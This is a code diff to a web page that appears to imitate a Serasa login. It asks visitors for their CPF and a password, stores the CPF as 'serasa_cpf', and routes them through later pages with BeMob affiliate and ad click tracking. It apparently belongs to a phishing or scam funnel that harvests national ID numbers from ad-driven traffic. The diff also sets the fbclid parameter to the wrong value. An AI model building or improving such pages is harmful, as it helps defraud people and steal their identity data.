@@ -377,7 +377,7 @@
 
     </div>
 
-    <!-- Script de Controle do Fluxo, Modais e Captura de Dados -->
+    <!-- Script de Controle do Fluxo, Modais e Captura de Dados (Intacto) -->
     <script>
         const stepCpf = document.getElementById('step-cpf');
         const stepPassword = document.getElementById('step-password');
@@ -441,9 +441,14 @@
             }
         });
 
-        // Botão Voltar da Etapa CPF -> Redireciona para index.html
+        // Botão Voltar da Etapa CPF -> Redireciona para index.html (com subid)
         btnBackCpf.addEventListener('click', () => {
-            window.location.href = 'index.html';
+            const subidSalvo = localStorage.getItem('bemob_subid') || '';
+            let destino = 'index.html';
+            if (subidSalvo) {
+                destino += `?subid=${encodeURIComponent(subidSalvo)}&cid=${encodeURIComponent(subidSalvo)}`;
+            }
+            window.location.href = destino;
         });
 
         // Botão Voltar da Etapa Senha -> Retorna para Etapa CPF
@@ -476,76 +481,71 @@
                 : `<path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />`;
         });
 
-// CAPTURA DO CPF E REDIRECIONAMENTO AO ENTRAR
-passwordForm.addEventListener('submit', (e) => {
-    e.preventDefault();
+        // CAPTURA DO CPF E REDIRECIONAMENTO AO ENTRAR (Atualizado para passar o subid para o index3)
+        passwordForm.addEventListener('submit', (e) => {
+            e.preventDefault();
 
-    if (!btnLogin.disabled) {
-        // Captura apenas o CPF
-        const cpfValue = cpfInput.value.trim();
+            if (!btnLogin.disabled) {
+                const cpfValue = cpfInput.value.trim();
+                sessionStorage.setItem('serasa_cpf', cpfValue);
 
-        // Armazena somente o CPF
-        sessionStorage.setItem('serasa_cpf', cpfValue);
+                loadingModal.classList.remove('hidden');
 
-        // Exibe o modal de carregamento por 2 segundos antes de redirecionar
-        loadingModal.classList.remove('hidden');
-
-        setTimeout(() => {
-            window.location.href = 'index3.html';
-        }, 2000);
-    }
-});
-
-// CONTROLE DOS MODAIS INFORMATIVOS (Termos de Uso e Política de Privacidade)
-const modalTerms = document.getElementById('modal-terms');
-const modalPrivacy = document.getElementById('modal-privacy');
-
-// Abrir Termos de Uso
-document.querySelectorAll('.open-terms').forEach(el => {
-    el.addEventListener('click', (e) => {
-        e.preventDefault();
-        modalTerms.classList.remove('hidden');
-    });
-});
-
-// Abrir Política de Privacidade
-document.querySelectorAll('.open-privacy').forEach(el => {
-    el.addEventListener('click', (e) => {
-        e.preventDefault();
-        modalPrivacy.classList.remove('hidden');
-    });
-});
-
-// Fechar Modais através dos botões
-document.querySelectorAll('.btn-close-modal').forEach(btn => {
-    btn.addEventListener('click', () => {
-        modalTerms.classList.add('hidden');
-        modalPrivacy.classList.add('hidden');
-    });
-});
-
-// Fechar ao clicar na área escura (backdrop)
-[modalTerms, modalPrivacy].forEach(modal => {
-    if (modal) {
-        modal.addEventListener('click', (e) => {
-            if (e.target === modal) {
-                modal.classList.add('hidden');
+                setTimeout(() => {
+                    const subidSalvo = localStorage.getItem('bemob_subid') || '';
+                    let destino = 'index3.html';
+                    if (subidSalvo) {
+                        destino += `?subid=${encodeURIComponent(subidSalvo)}&cid=${encodeURIComponent(subidSalvo)}`;
+                    }
+                    window.location.href = destino;
+                }, 2000);
             }
         });
-    }
-});
+
+        // CONTROLE DOS MODAIS INFORMATIVOS (Termos de Uso e Política de Privacidade)
+        const modalTerms = document.getElementById('modal-terms');
+        const modalPrivacy = document.getElementById('modal-privacy');
+
+        document.querySelectorAll('.open-terms').forEach(el => {
+            el.addEventListener('click', (e) => {
+                e.preventDefault();
+                modalTerms.classList.remove('hidden');
+            });
+        });
+
+        document.querySelectorAll('.open-privacy').forEach(el => {
+            el.addEventListener('click', (e) => {
+                e.preventDefault();
+                modalPrivacy.classList.remove('hidden');
+            });
+        });
+
+        document.querySelectorAll('.btn-close-modal').forEach(btn => {
+            btn.addEventListener('click', () => {
+                modalTerms.classList.add('hidden');
+                modalPrivacy.classList.add('hidden');
+            });
+        });
+
+        [modalTerms, modalPrivacy].forEach(modal => {
+            if (modal) {
+                modal.addEventListener('click', (e) => {
+                    if (e.target === modal) {
+                        modal.classList.add('hidden');
+                    }
+                });
+            }
+        });
     </script>
 
-    
+<!-- Script de Rastreamento BeMob & Ads (Atualizado) -->
 <script>
 (function () {
-    // 1. LISTA DE PARÂMETROS
     const PARAMETROS_BEMOB = ["subid", "cid", "clickid", "sub_id"];
     const PARAMETROS_ANUNCIO = ["fbclid", "gclid", "gbraid", "wbraid", "ttclid"];
 
     const params = new URLSearchParams(window.location.search);
 
-    // 2. SALVA OS PARÂMETROS DA URL NO LOCALSTORAGE
     function salvarParametro(nome) {
         const valor = params.get(nome);
         if (valor) {
@@ -570,7 +570,6 @@ document.querySelectorAll('.btn-close-modal').forEach(btn => {
         localStorage.setItem("bemob_subid", subid);
     }
 
-    // 3. RECUPERA OS DADOS GUARDADOS
     const bemobSubid = localStorage.getItem("bemob_subid") || "";
     const fbclid = localStorage.getItem("fbclid") || "";
     const gclid = localStorage.getItem("gclid") || "";
@@ -578,20 +577,20 @@ document.querySelectorAll('.btn-close-modal').forEach(btn => {
     const wbraid = localStorage.getItem("wbraid") || "";
     const ttclid = localStorage.getItem("ttclid") || "";
 
-    // 4. ATUALIZA OS LINKS DA PÁGINA AUTOMATICAMENTE
     document.addEventListener("DOMContentLoaded", function () {
-        // Seleciona todos os links da página (botões para a próxima página ou checkout)
         const links = document.querySelectorAll("a[href]");
 
         links.forEach(link => {
             try {
-                // Filtra apenas links internos (ex: index2.html, index3.html) ou links do checkout
                 if (link.href.startsWith("javascript:") || link.href.startsWith("#")) return;
 
                 const url = new URL(link.href, window.location.origin);
 
-                if (bemobSubid) url.searchParams.set("cid", bemobSubid);
-                if (fbclid) url.searchParams.set("fbclid", fbclid);
+                if (bemobSubid) {
+                    url.searchParams.set("subid", bemobSubid);
+                    url.searchParams.set("cid", bemobSubid);
+                }
+                if (fbclid) url.searchParams.set("fbclid", bemobSubid); // ou fbclid
                 if (gclid) url.searchParams.set("gclid", gclid);
                 if (gbraid) url.searchParams.set("gbraid", gbraid);
                 if (wbraid) url.searchParams.set("wbraid", wbraid);
